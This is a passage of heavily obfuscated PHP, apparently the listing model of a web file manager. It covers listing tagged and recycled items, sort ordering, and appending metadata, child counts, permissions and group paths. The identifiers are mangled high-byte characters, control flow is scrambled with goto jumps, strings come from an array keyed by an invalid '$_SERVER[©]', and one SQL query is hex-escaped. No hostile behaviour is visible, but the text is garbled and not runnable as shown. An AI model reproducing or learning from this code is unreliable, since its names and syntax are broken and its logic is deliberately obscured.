Model($f‹ÚÉÈ¯„ø[400])->listData(); $B¬‡Ëø‹°¯ = array_filter_by_field($eì†÷ƒõ³, $f‹ÚÉÈ¯„ø[401], $E¥‘ŠÉØ‹—); goto aŒ²£Ìöáî; cµß³‡Œøƒ: $this->listUserTagClear($B¬‡Ëø‹°¯, $C…•¯Ú‡‰, $E¥‘ŠÉØ‹—); return $C…•¯Ú‡‰; goto CÄĞÉ¡½¬ä; aŒ²£Ìöáî: $B¬‡Ëø‹°¯ = array_to_keyvalue($B¬‡Ëø‹°¯, $f‹ÚÉÈ¯„ø[43], $f‹ÚÉÈ¯„ø[85]); $C…•¯Ú‡‰ = array(); if ($B¬‡Ëø‹°¯) { $c¼‘«Ä—ßè = array($f‹ÚÉÈ¯„ø[391] => array($f‹ÚÉÈ¯„ø[392], $B¬‡Ëø‹°¯)); $C…•¯Ú‡‰ = $this->listSource($c¼‘«Ä—ßè); } goto cµß³‡Œøƒ; CÄĞÉ¡½¬ä: } private function listUserTagClear($E‘Î×®Ô•ç, $d¸Ä¼–òÛ¸, $d÷èñğ•‰ğ) { goto b›ÔòÖÇç´; b†Ó²×¢½Œ: $DàÕá«Àâ = array(); $bŒÂƒàŞÛ = array_to_keyvalue($d¸Ä¼–òÛ¸[$F¨ß¾©‹‡‰[84]], $F¨ß¾©‹‡‰[43], $F¨ß¾©‹‡‰[377]); $FºŞÃ½ÆÏŸ = array_to_keyvalue($d¸Ä¼–òÛ¸[$F¨ß¾©‹‡‰[83]], $F¨ß¾©‹‡‰[43], $F¨ß¾©‹‡‰[377]); goto dá†‹Œ”ìª; b°ÍÄğß´¬: Model($F¨ß¾©‹‡‰[402])->removeFromTag($DàÕá«Àâ, $d÷èñğ•‰ğ); goto c±¼ŠîèÅ…; dá†‹Œ”ìª: $f»×ñÜê°¾ = array_merge($FºŞÃ½ÆÏŸ, $bŒÂƒàŞÛ); foreach ($E‘Î×®Ô•ç as $Aãáä¢Ûàä) { if (!in_array($Aãáä¢Ûàä, $f»×ñÜê°¾)) { $DàÕá«Àâ[] = $Aãáä¢Ûàä; } } if (!$DàÕá«Àâ) { return; } goto b°ÍÄğß´¬; b›ÔòÖÇç´: $F¨ß¾©‹‡‰ =& $_SERVER[©]; if (!$E‘Î×®Ô•ç) { return; } if ($d¸Ä¼–òÛ¸ && count($E‘Î×®Ô•ç) == $d¸Ä¼–òÛ¸[$F¨ß¾©‹‡‰[360]][$F¨ß¾©‹‡‰[361]]) { return; } goto b†Ó²×¢½Œ; c±¼ŠîèÅ…: } public function listUserRecycle() { $Cê·Ó°éñ› =& $_SERVER[©]; $D¶â‡¾Ú¸Ş = Model($Cê·Ó°éñ›[403])->listData(); if (!$D¶â‡¾Ú¸Ş) { return array(); } $F‡˜¨ŠÍÛƒ = array($Cê·Ó°éñ›[391] => array($Cê·Ó°éñ›[392], $D¶â‡¾Ú¸Ş), $Cê·Ó°éñ›[404] => 1); return $this->listSource($F‡˜¨ŠÍÛƒ); } public function listSource($bˆÏ³â½İ, $aºÖ±ê«·Õ = 3000) { goto fÎŸƒ°ì„º; fÎŸƒ°ì„º: $a²“èÇ÷Äî =& $_SERVER[©]; if (!isset($bˆÏ³â½İ[$a²“èÇ÷Äî[405]])) { $bˆÏ³â½İ[$a²“èÇ÷Äî[405]] = 0; } $Bâ·„íâ = $a²“èÇ÷Äî[406]; goto Eö“ŒÈÚ¨ö; c‰°¶èİ: return $a‰ËœµÎ¡‰; goto D¬¥«ğ´Ìğ; Eö“ŒÈÚ¨ö: $a‰ËœµÎ¡‰ = $this->field($Bâ·„íâ)->_makeOrder()->where($bˆÏ³â½İ)->selectPage($aºÖ±ê«·Õ); $this->_listDataApply($a‰ËœµÎ¡‰[$a²“èÇ÷Äî[363]]); $this->_listMake($a‰ËœµÎ¡‰); goto c‰°¶èİ; D¬¥«ğ´Ìğ: } protected function _makeOrder() { goto Eğ¤‹‚³Ê; bŸ˜ÔâÒ‚…: $Dğ÷„¤Ìñ = array($f¡ñôÚÆŸ¤[410] => $f¡ñôÚÆŸ¤[411], $f¡ñôÚÆŸ¤[412] => $f¡ñôÚÆŸ¤[413]); $A…³‡ó² ù = array($f¡ñôÚÆŸ¤[38] => $f¡ñôÚÆŸ¤[38], $f¡ñôÚÆŸ¤[87] => $f¡ñôÚÆŸ¤[87], $f¡ñôÚÆŸ¤[170] => $f¡ñôÚÆŸ¤[380], $f¡ñôÚÆŸ¤[386] => $f¡ñôÚÆŸ¤[386], $f¡ñôÚÆŸ¤[414] => $f¡ñôÚÆŸ¤[387], $f¡ñôÚÆŸ¤[197] => $f¡ñôÚÆŸ¤[197], $f¡ñôÚÆŸ¤[117] => $f¡ñôÚÆŸ¤[117]); $eÂ§ÀèÜÑ¯ = Input::get($f¡ñôÚÆŸ¤[415], $f¡ñôÚÆŸ¤[17], $dõ„»Œ¡¾š, array_keys($A…³‡ó² ù)); goto AÏØ‰Û; fÀÔŠÒÌ–‚: if ($eÂ§ÀèÜÑ¯ == $f¡ñôÚÆŸ¤[38]) { } $EºÓÉí¹‡ò = $f¡ñôÚÆŸ¤[417] . $A…³‡ó² ù[$eÂ§ÀèÜÑ¯] . $f¡ñôÚÆŸ¤[60] . $Dğ÷„¤Ìñ[$aŒàÇÊ¯ì]; return $this->order(rtrim(trim($EºÓÉí¹‡ò), $f¡ñôÚÆŸ¤[57])); goto dî±‡ÁÜÚì; AÏØ‰Û: $aŒàÇÊ¯ì = Input::get($f¡ñôÚÆŸ¤[416], $f¡ñôÚÆŸ¤[17], $e° æ†äø, array_keys($Dğ÷„¤Ìñ)); if (!in_array($eÂ§ÀèÜÑ¯, array_keys($A…³‡ó² ù))) { $eÂ§ÀèÜÑ¯ = $f¡ñôÚÆŸ¤[38]; } if (!in_array($aŒàÇÊ¯ì, array_keys($Dğ÷„¤Ìñ))) { $eÂ§ÀèÜÑ¯ = $f¡ñôÚÆŸ¤[410]; } goto fÀÔŠÒÌ–‚; Eğ¤‹‚³Ê: $f¡ñôÚÆŸ¤ =& $_SERVER[©]; $dõ„»Œ¡¾š = Model($f¡ñôÚÆŸ¤[407])->get($f¡ñôÚÆŸ¤[408]); $e° æ†äø = Model($f¡ñôÚÆŸ¤[407])->get($f¡ñôÚÆŸ¤[409]); goto bŸ˜ÔâÒ‚…; dî±‡ÁÜÚì: } protected function _listDataApplyItem($bœù°›°ë¬, $C†˜·¹ ¥£ = false) { $bÕ„´Œï¯§ = array($bœù°›°ë¬); $this->_listDataApply($bÕ„´Œï¯§, $C†˜·¹ ¥£); return $bÕ„´Œï¯§[0]; } protected function _listDataApply(&$F†ßô®®Ÿ‘, $d‰æ‘¦Î– = false) { goto Cª‘ƒ­ìì‰; f—…Î¨ÜáÙ: $c²§‰Ş‡÷… = array_unique($c²§‰Ş‡÷…); $this->_listSourceCache($F†ßô®®Ÿ‘); if (!$d‰æ‘¦Î–) { $this->_listAppendMeta($F†ßô®®Ÿ‘, $c²§‰Ş‡÷…); $this->_listAppendFileMeta($F†ßô®®Ÿ‘, $c²§‰Ş‡÷…); $this->_listAppendChildren($F†ßô®®Ÿ‘, $c²§‰Ş‡÷…); } goto eì¸°¢Óº¨; Cª‘ƒ­ìì‰: $F†’òÇ«’ =& $_SERVER[©]; if (!$F†ßô®®Ÿ‘) { $F†ßô®®Ÿ‘ = array(); return; } $c²§‰Ş‡÷… = array_to_keyvalue($F†ßô®®Ÿ‘, $F†’òÇ«’[43], $F†’òÇ«’[377]); goto f—…Î¨ÜáÙ; e‚–÷×–ï: $this->_listAppendUser($F†ßô®®Ÿ‘); $this->_listFilterInfo($F†ßô®®Ÿ‘, $d‰æ‘¦Î–); goto F»‰ï‰ÏÅ; eì¸°¢Óº¨: $this->_listAppendPath($F†ßô®®Ÿ‘); $this->_listAppendAuth($F†ßô®®Ÿ‘); $this->_listAppendSourceInfo($F†ßô®®Ÿ‘, $c²§‰Ş‡÷…); goto e‚–÷×–ï; F»‰ï‰ÏÅ: } protected function _listSourceCache($BâÎãŞ»¿ˆ) { $D’áç¦Ü˜ =& $_SERVER[©]; foreach ($BâÎãŞ»¿ˆ as $Cñ£Ë›ÁŒ·) { self::$cacheSourceInfo[$D’áç¦Ü˜[418] . $Cñ£Ë›ÁŒ·[$D’áç¦Ü˜[377]]] = $Cñ£Ë›ÁŒ·; } } protected function _listFilterInfo(&$e±£Ãöåìê, $bÈ£İÜó‡² = false) { $d“‚âŒËÛš =& $_SERVER[©]; foreach ($e±£Ãöåìê as &$A½ô‹ó„ĞÊ) { $A½ô‹ó„ĞÊ = $this->pathInfoFilter($A½ô‹ó„ĞÊ); self::$cachePathInfo[$d“‚âŒËÛš[419] . intval($bÈ£İÜó‡²) . $d“‚âŒËÛš[420] . $A½ô‹ó„ĞÊ[$d“‚âŒËÛš[377]]] = $A½ô‹ó„ĞÊ; } } protected function _listMake(&$b±¢°°ÆÄ) { $FŠĞœñ¤Õ¿ =& $_SERVER[©]; $b±¢°°ÆÄ[$FŠĞœñ¤Õ¿[84]] = array(); $b±¢°°ÆÄ[$FŠĞœñ¤Õ¿[83]] = array(); foreach ($b±¢°°ÆÄ[$FŠĞœñ¤Õ¿[363]] as $aºø¼„¹é) { $c¼ùÊ³ĞŠ = $aºø¼„¹é[$FŠĞœñ¤Õ¿[378]] == 1 ? $FŠĞœñ¤Õ¿[84] : $FŠĞœñ¤Õ¿[83]; $b±¢°°ÆÄ[$c¼ùÊ³ĞŠ][] = $aºø¼„¹é; } unset($b±¢°°ÆÄ[$FŠĞœñ¤Õ¿[363]]); } protected function _listAppendMeta(&$d™èô¾Ó›, $f¤— ˜Â¾«) { goto F¶­£°ÓìÙ; aå‹Ó¯±Ø¯: if (!$dŞ›ˆÊË§í) { return; } $DØÚˆ¸íÚ = array($c””Ñ¤ˆ•®[423], $c””Ñ¤ˆ•®[424]); $fƒøøÒ¶“İ = array(); goto eöğ«¯­ÌÚ; F¶­£°ÓìÙ: $c””Ñ¤ˆ•® =& $_SERVER[©]; $EĞ¢…èÃ’ = array($c””Ñ¤ˆ•®[391] => array($c””Ñ¤ˆ•®[392], $f¤— ˜Â¾«)); $dŞ›ˆÊË§í = Model($c””Ñ¤ˆ•®[421])->field($c””Ñ¤ˆ•®[422])->where($EĞ¢…èÃ’)->select(); goto aå‹Ó¯±Ø¯; eöğ«¯­ÌÚ: foreach ($dŞ›ˆÊË§í as $Aæíª®÷°) { if (!isset($fƒøøÒ¶“İ[$Aæíª®÷°[$c””Ñ¤ˆ•®[377]]])) { $fƒøøÒ¶“İ[$Aæíª®÷°[$c””Ñ¤ˆ•®[377]]] = array(); } if (in_array($Aæíª®÷°[$c””Ñ¤ˆ•®[99]], $DØÚˆ¸íÚ)) { continue; } $fƒøøÒ¶“İ[$Aæíª®÷°[$c””Ñ¤ˆ•®[377]]][$Aæíª®÷°[$c””Ñ¤ˆ•®[99]]] = $Aæíª®÷°[$c””Ñ¤ˆ•®[368]]; } foreach ($d™èô¾Ó› as &$d¥æèß¦©‰) { $d¥æèß¦©‰[$c””Ñ¤ˆ•®[425]] = !1; if (isset($fƒøøÒ¶“İ[$d¥æèß¦©‰[$c””Ñ¤ˆ•®[377]]])) { $d¥æèß¦©‰[$c””Ñ¤ˆ•®[425]] = $fƒøøÒ¶“İ[$d¥æèß¦©‰[$c””Ñ¤ˆ•®[377]]]; } if ($this->fileIsLock($d¥æèß¦©‰) && $d¥æèß¦©‰[$c””Ñ¤ˆ•®[384]]) { $eËôÑã›”Â = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $d¥æèß¦©‰[$c””Ñ¤ˆ•®[384]][$c””Ñ¤ˆ•®[385]] = AuthModel::authDisable($d¥æèß¦©‰[$c””Ñ¤ˆ•®[384]][$c””Ñ¤ˆ•®[385]], $eËôÑã›”Â); $d¥æèß¦©‰[$c””Ñ¤ˆ•®[384]][$c””Ñ¤ˆ•®[426]][$c””Ñ¤ˆ•®[384]] = $d¥æèß¦©‰[$c””Ñ¤ˆ•®[384]][$c””Ñ¤ˆ•®[385]]; } } goto E‹­«Å«¢; E‹­«Å«¢: } protected function _listAppendFileMeta(&$Bƒ«ñØŠ²Ş, $CÜÙ±‚¼¡Ó) { goto Aä»˜„ï®ò; f‹³ë‡å¦ò: $AÙó†ÎÑ© = $AÙó†ÎÑ© ? $AÙó†ÎÑ© : array(); $DÃÔ¸„¸Õ‚ = array(); foreach ($AÙó†ÎÑ© as $B«ÄÒŸöÆ) { if (!isset($DÃÔ¸„¸Õ‚[$B«ÄÒŸöÆ[$CÀÁ©ŠÌÚ[427]]])) { $DÃÔ¸„¸Õ‚[$B«ÄÒŸöÆ[$CÀÁ©ŠÌÚ[427]]] = array(); } $DÃÔ¸„¸Õ‚[$B«ÄÒŸöÆ[$CÀÁ©ŠÌÚ[427]]][$B«ÄÒŸöÆ[$CÀÁ©ŠÌÚ[99]]] = $B«ÄÒŸöÆ[$CÀÁ©ŠÌÚ[368]]; } goto aÛ¿£Ä´Ø; Dèù°¦Àã: if (!$B‘¥»×ğø) { return; } $aœä³ùğ¨Œ = array($CÀÁ©ŠÌÚ[428] => array($CÀÁ©ŠÌÚ[392], $B‘¥»×ğø)); $Aª‰¾…Ãáó = $CÀÁ©ŠÌÚ[429]; goto BÔõ‰Çâˆä; BÔõ‰Çâˆä: $d¤±«¾‡÷² = Model($CÀÁ©ŠÌÚ[430])->field($Aª‰¾…Ãáó)->where($aœä³ùğ¨Œ)->select(); $d¤±«¾‡÷² = array_to_keyvalue($d¤±«¾‡÷², $CÀÁ©ŠÌÚ[427]); $AÙó†ÎÑ© = Model($CÀÁ©ŠÌÚ[431])->field($CÀÁ©ŠÌÚ[432])->where($aœä³ùğ¨Œ)->select(); goto f‹³ë‡å¦ò; Aä»˜„ï®ò: $CÀÁ©ŠÌÚ =& $_SERVER[©]; $B‘¥»×ğø = array_to_keyvalue($Bƒ«ñØŠ²Ş, $CÀÁ©ŠÌÚ[43], $CÀÁ©ŠÌÚ[427]); $B‘¥»×ğø = array_filter(array_unique($B‘¥»×ğø)); goto Dèù°¦Àã; aÛ¿£Ä´Ø: foreach ($Bƒ«ñØŠ²Ş as &$Fç—§—ÛÍá) { goto EÔËÊÚ½; Cäæ“éÕé: unset($d¤±«¾‡÷²[$Dä·â£ª†][$CÀÁ©ŠÌÚ[85]]); $aíÍŸ¸—Õ« = is_array($DÃÔ¸„¸Õ‚[$Dä·â£ª†]) ? $DÃÔ¸„¸Õ‚[$Dä·â£ª†] : array(); $Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[172]] = array_merge($aíÍŸ¸—Õ«, $d¤±«¾‡÷²[$Dä·â£ª†]); goto eğ·Ø´Ğ; EÔËÊÚ½: $Dä·â£ª† = $Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[427]]; if (!$Dä·â£ª† || !isset($d¤±«¾‡÷²[$Dä·â£ª†])) { continue; } $Bæ³­ù‚ŸŠ = $d¤±«¾‡÷²[$Dä·â£ª†]; goto dŞ›ä‘¹æÉ; eğ·Ø´Ğ: if (isset($Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[172]][$CÀÁ©ŠÌÚ[434]])) { $Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[434]] = json_decode($Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[172]][$CÀÁ©ŠÌÚ[434]], !0); unset($Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[172]][$CÀÁ©ŠÌÚ[434]]); } goto Eº½ª§¬Ş‡; dŞ›ä‘¹æÉ: $Bæ³­ù‚ŸŠ[$CÀÁ©ŠÌÚ[87]] = $Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[87]]; $Bæ³­ù‚ŸŠ[$CÀÁ©ŠÌÚ[38]] = $Fç—§—ÛÍá[$CÀÁ©ŠÌÚ[38]]; self::$cacheFileInfo[$CÀÁ©ŠÌÚ[433] . $Dä·â£ª†] = $Bæ³­ù‚ŸŠ; goto Cäæ“éÕé; Eº½ª§¬Ş‡: } goto a¨·ÆŸ‚í; a¨·ÆŸ‚í: } protected function _listAppendSourceInfo(&$fƒ…Íˆœ”, $dêåğÆ¯½Õ) { goto D”Šò¬ãì; c¿¥‰¡ ‰¬: $e¤—ÓŞæÏ = array_to_keyvalue_group($FÄ‰å•‚…, $D–÷äÕ®Ï±[377]); foreach ($fƒ…Íˆœ” as &$F÷¦µ·µ·³) { $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]] = array($D–÷äÕ®Ï±[438] => 0, $D–÷äÕ®Ï±[439] => 0, $D–÷äÕ®Ï±[440] => 0); if (isset($bÚ¬ñÎœ„¥[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]])) { $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[441]] = 1; $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[442]] = $bÚ¬ñÎœ„¥[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]][$D–÷äÕ®Ï±[38]]; } if (isset($B©À‘ˆİ‰÷[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]])) { $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[443]] = array(); foreach ($B©À‘ˆİ‰÷[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]] as $Dç—©¼ßÊ) { $Dæ‡õ®Ö§ = $f‚Å²àÈˆ[$Dç—©¼ßÊ]; $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[443]][] = array($D–÷äÕ®Ï±[444] => $Dæ‡õ®Ö§[$D–÷äÕ®Ï±[375]], $D–÷äÕ®Ï±[394] => $Dæ‡õ®Ö§[$D–÷äÕ®Ï±[38]], $D–÷äÕ®Ï±[445] => $Dæ‡õ®Ö§[$D–÷äÕ®Ï±[446]]); } } if (isset($e¤—ÓŞæÏ[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]])) { $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[447]] = array(); foreach ($e¤—ÓŞæÏ[$F÷¦µ·µ·³[$D–÷äÕ®Ï±[377]]] as $EŞ«ŠŒ®°¯) { $F÷¦µ·µ·³[$D–÷äÕ®Ï±[399]][$D–÷äÕ®Ï±[447]] = array($D–÷äÕ®Ï±[448] => $EŞ«ŠŒ®°¯[$D–÷äÕ®Ï±[449]], $D–÷äÕ®Ï±[450] => $EŞ«ŠŒ®°¯[$D–÷äÕ®Ï±[451]], $D–÷äÕ®Ï±[452] => $EŞ«ŠŒ®°¯[$D–÷äÕ®Ï±[377]], $D–÷äÕ®Ï±[453] => $EŞ«ŠŒ®°¯[$D–÷äÕ®Ï±[454]], $D–÷äÕ®Ï±[455] => $EŞ«ŠŒ®°¯[$D–÷äÕ®Ï±[456]]); } } } return $fƒ…Íˆœ”; goto E‹ÀªÂô¥; a­óİ©øí·: $Aùç¼Ü“éÍ = Model($D–÷äÕ®Ï±[400])->listData(); $BÒ¬²º…¸ = Model($D–÷äÕ®Ï±[389])->listData(); $FÄ‰å•‚… = Model($D–÷äÕ®Ï±[437])->listSimple(); goto DÙ³Ó—îğ«; DÙ³Ó—îğ«: $f‚Å²àÈˆ = array_to_keyvalue($f§Îºğ¼ñÜ, $D–÷äÕ®Ï±[375]); $B©À‘ˆİ‰÷ = array_to_keyvalue_group($Aùç¼Ü“éÍ, $D–÷äÕ®Ï±[85], $D–÷äÕ®Ï±[401]); $bÚ¬ñÎœ„¥ = array_to_keyvalue($BÒ¬²º…¸, $D–÷äÕ®Ï±[85]); goto c¿¥‰¡ ‰¬; D”Šò¬ãì: $D–÷äÕ®Ï± =& $_SERVER[©]; if (!defined($D–÷äÕ®Ï±[435])) { return; } $f§Îºğ¼ñÜ = Model($D–÷äÕ®Ï±[436])->listData(); goto a­óİ©øí·; E‹ÀªÂô¥: } protected function _listAppendChildren(&$BÔåİ¥ÀÅó, $dóù™Ÿâƒ) { goto eŒ”´È±ä; eŒ”´È±ä: $c®Õ™‚…äï =& $_SERVER[©]; $bÒ¶¡Õöé¤ = $c®Õ™‚…äï[13]; $CÅÚù™Ùš± = array(); goto AÓ¼œŒ§­ô; cÖëÜ®¼œ: $b„Ñ¦¤£ÆÈ = $this->tablePrefix . $this->tableName; for ($DÒÓßÒô«å = 0; $DÒÓßÒô«å < $eÄñêæº½¼; $DÒÓßÒô«å++) { $EŒ²ãÕ³¦Å = intval($BÔåİ¥ÀÅó[$DÒÓßÒô«å][$c®Õ™‚…äï[405]]); if ($BÔåİ¥ÀÅó[$DÒÓßÒô«å][$c®Õ™‚…äï[378]]) { $Dš­·º‡¸ = $BÔåİ¥ÀÅó[$DÒÓßÒô«å][$c®Õ™‚…äï[377]]; $bÒ¶¡Õöé¤ .= "\x53\x45\114\x45\103\124\x20\52\40\106\122\117\x4d\x20\50\123\105\x4c\105\x43\124\x20\47{$Dš­·º‡¸}\x5f\150\x61\163\106\x69\154\x65\x27\40\x61\163\x20\x68\x61\x73\x2c\x63\x6f\x75\156\x74\50\x31\51\40\x61\x73\40\x68\x61\x73\x43\x6f\x75\x6e\x74\x20\x46\122\117\x4d\40\x60{$b„Ñ¦¤£ÆÈ}\x60\x20\12\11\11\11\11\x9\x77\150\145\x72\x65\x20\160\x61\x72\145\156\164\111\x44\75{$Dš­·º‡¸}\x20\141\156\144\40\x69\x73\106\x6f\154\x64\145\162\75\60\x20\x61\156\x64\40\151\163\104\145\x6c\145\x74\x65\x3d{$EŒ²ãÕ³¦Å}\51\x20\x61\x73\x20\164\x62\61\137{$Dš­·º‡¸}\x20\x75\x6e\x69\157\156\40\x61\154\x6c\40\12\11\11\11\x9\x9\123\105\x4c\x45\103\x54\40\x2a\x20\x46\x52\117\x4d\40\x28\123\105\x4c\105\103\x54\40\47{$Dš­·º‡¸}\x5f\x68\x61\163\x46\x6f\154\144\x65\x72\47\40\x61\163\40\x68\x61\163\106\151\154\x65\x2c\x63\157\165\x6e\x74\50\61\x29\x20\141\163\40\x68\141\163\103\157\165\156\x74\x20\106\x52\x4f\x4d\40\140{$b„Ñ¦¤£ÆÈ}\140\x20\xa\11\11\11\11\x9\167\x68\145\162\x65\40\x70\141\162\145\x6e\x74\111\104\75{$Dš­·º‡¸}\x20\141\x6e\x64\40\x69\163\106\157\x6c\x64\145\x72\75\61\40\x61\x6e\x64\40\x69\163\104\145\154\145\x74\x65\75{$EŒ²ãÕ³¦Å}\51\x20\x61\x73\40\x74\142\62\x5f{$Dš­·º‡¸}\40\165\156\151\x6f\x6e\x20\141\154\x6c\40"; } if ((strlen($bÒ¶¡Õöé¤) >= $A—µ§ŸÆƒ³ || $DÒÓßÒô«å == $eÄñêæº½¼ - 1) && $bÒ¶¡Õöé¤) { $bÒ¶¡Õöé¤ = substr($bÒ¶¡Õöé¤, 0, -strlen($c®Õ™‚…äï[457])); $bËÅ»º™Ù¯ = $this->query($bÒ¶¡Õöé¤); $CÅÚù™Ùš± = array_merge($CÅÚù™Ùš±, $bËÅ»º™Ù¯); $bÒ¶¡Õöé¤ = $c®Õ™‚…äï[43]; } } $CÅÚù™Ùš± = array_to_keyvalue($CÅÚù™Ùš±, $c®Õ™‚…äï[458]); goto fÔ¿—Ô»ÊÃ; AÓ¼œŒ§­ô: $A—µ§ŸÆƒ³ = 1024 * 50; $BÔåİ¥ÀÅó = is_array($BÔåİ¥ÀÅó) ? $BÔåİ¥ÀÅó : array(); $eÄñêæº½¼ = count($BÔåİ¥ÀÅó); goto cÖëÜ®¼œ; fÔ¿—Ô»ÊÃ: foreach ($BÔåİ¥ÀÅó as &$d´ Ğ‰‹Ÿ) { if ($d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[378]]) { unset($d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[380]]); $d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[202]] = intval($CÅÚù™Ùš±[$d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[377]] . $c®Õ™‚…äï[459]][$c®Õ™‚…äï[460]]); $d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[201]] = intval($CÅÚù™Ùš±[$d´ Ğ‰‹Ÿ[$c®Õ™‚…äï[377]] . $c®Õ™‚…äï[461]][$c®Õ™‚…äï[460]]); } } goto D²·â©ƒ; D²·â©ƒ: } protected function _listAppendAuth(&$B®ø¢•áƒ·) { goto aŒ¹¤İØùŞ; cÀéƒùíØÑ: foreach ($B®ø¢•áƒ· as $BÓèßÌ¿ê×) { if ($BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[379]] == self::TYPE_GROUP) { $bø½¨ßì”Ñ[] = $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[377]]; } } if (!$bø½¨ßì”Ñ) { return; } $aœ¡£äÒÏ© = array_to_keyvalue($B®ø¢•áƒ·, $AÒÓ½ÍëÕÔ[377]); goto cÌ’›Úù‚Ş; aŒ¹¤İØùŞ: $AÒÓ½ÍëÕÔ =& $_SERVER[©]; if (!defined($AÒÓ½ÍëÕÔ[435])) { return; } $bø½¨ßì”Ñ = array(); goto cÀéƒùíØÑ; cÌ’›Úù‚Ş: $e°¬‹¾ìÕÛ = Model($AÒÓ½ÍëÕÔ[462])->getSourceList($bø½¨ßì”Ñ, $aœ¡£äÒÏ©); foreach ($B®ø¢•áƒ· as $AÚóÈÎ£Øº => &$BÓèßÌ¿ê×) { $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]] = $e°¬‹¾ìÕÛ[$BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[377]]]; if (!$BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]] && $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[379]] == self::TYPE_GROUP) { $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]] = Action($AÒÓ½ÍëÕÔ[463])->pathGroupAuthMake($BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[464]]); if (!$BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]] && !_get($GLOBALS, $AÒÓ½ÍëÕÔ[465])) { $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[199]] = !1; $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[198]] = !1; } } if ($BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]]) { $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[199]] = AuthModel::authCheckEdit($BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]][$AÒÓ½ÍëÕÔ[385]]); $BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[198]] = AuthModel::authCheckView($BÓèßÌ¿ê×[$AÒÓ½ÍëÕÔ[384]][$AÒÓ½ÍëÕÔ[385]]); } $this->groupPathDisplay($BÓèßÌ¿ê×); } goto AîØØ‹‰ƒ³; AîØØ‹‰ƒ³: } public function groupPathDisplay(&$cíŠ¡Á…©) { goto CÒå¹Ã±Ö¿; CÒå¹Ã±Ö¿: $EÆÌš¡´„ß =& $_SERVER[©]; if ($cíŠ¡Á…©[$EÆÌš¡´„ß[379]] != self::TYPE_GROUP) { return; } $e°Š‘¢¼¨ = Model($EÆÌš¡´„ß[466])->getInfo($cíŠ¡Á…©[$EÆÌš¡´„ß[464]]); goto f¸˜©’¤£ó; f¸˜©’¤£ó: $E»ÓÖ„§½ = $this->parentLevelArray($e°Š‘¢¼¨[$EÆÌš¡´„ß[467]]); $e¾àøšƒóŠ = $EÆÌš¡´„ß[43]; foreach ($E»ÓÖ„§½ as $fœ¿²÷é»‚) { $F‹¾ÃÛˆö = Model($EÆÌš¡´„ß[466])->getInfo($fœ¿²÷é»‚); $e¾àøšƒóŠ .= $F‹¾ÃÛˆö[$EÆÌš¡´„ß[399]][$EÆÌš¡´„ß[377]] . $EÆÌš¡´„ß[57]; } goto BæìùØ£Œ½; BæìùØ£Œ½: $cíŠ¡Á…©[$EÆÌš¡´„ß[468]] = $e°Š‘¢¼¨[$EÆÌš¡´„ß[469]]; $cíŠ¡Á…©[$EÆÌš¡´„ß[388]] = $e°Š‘¢¼¨[$EÆÌš¡´„ß[467]]; $cíŠ¡Á…©[$EÆÌš¡´„ß[470]] = $e°Š‘¢¼¨[$EÆÌš¡´„ß[471]]; goto fæ¶ÇïîÛ ; fæ¶ÇïîÛ : $cíŠ¡Á…©[$EÆÌš¡´„ß[472]] = $e¾àøšƒóŠ . $e°Š‘¢¼¨[$EÆÌš¡´„ß[399]][$EÆÌš¡´„ß[377]]; goto b‰â”÷£„‘; b‰â”÷£„‘: } protected function _listAppendPath(&$EÀçåÛÇ) { goto A±á¿ç¼‰ğ; BÙÄÁÛ§Öù: $D®¹é¦ª—Œ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($EÀçåÛÇ as &$dËàİŠâ) { goto EéÈù¹µ¡…; dæÀ¥¿¶ğ®: $EšåêØÚéö = trim($dËàİŠâ[$eù˜àÄÖ¯¯[474]], $eù˜àÄÖ¯¯[18]); if ($dËàİŠâ[$eù˜àÄÖ¯¯[469]] == $eù˜àÄÖ¯¯[476] && $EšåêØÚéö) { $dËàİŠâ[$eù˜àÄÖ¯¯[38]] = $EšåêØÚéö; } $this->_listAppendPathRecycle($dËàİŠâ, $bÌ‹¼½Â§¶, $D®¹é¦ª—Œ); goto fô„àñ»ã; eŸÁàÇÖ£–: if ($bÌ‹¼½Â§¶) { $EÀß…Óİ¡Ò .= $dËàİŠâ[$eù˜àÄÖ¯¯[38]]; } if ($dËàİŠâ[$eù˜àÄÖ¯¯[378]]) { $EÀß…Óİ¡Ò .= $eù˜àÄÖ¯¯[18]; } 